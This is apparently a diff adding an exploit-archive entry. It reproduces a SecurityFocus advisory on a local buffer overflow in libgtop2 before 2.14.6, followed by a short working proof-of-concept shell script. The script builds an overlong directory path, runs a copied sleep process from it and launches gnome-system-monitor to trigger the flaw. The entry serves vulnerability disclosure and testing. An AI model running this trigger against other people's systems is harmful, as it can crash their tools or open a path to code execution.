@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/22054/info
+
+The 'libgtop2' library is prone to a local buffer-overflow vulnerability because it fails to properly bounds-check user-supplied input before copying into an insufficiently sized memory buffer.
+
+An attacker may exploit this issue by enticing victims into viewing a maliciously crafted system process with an application that uses the affected library.
+
+Successful exploits may cause arbitrary code to run with the privileges of the victim. Failed exploit attempts will likely cause denial-of-service conditions.
+
+Versions prior to libgtop2 2.14.6 are reported vulnerable. 
+
+export dir=$(perl -e " print 's/'x1000;")
+mkdir -p $dir
+cp /bin/sleep $dir
+$dir/sleep 100 &
+gnome-system-monitor 
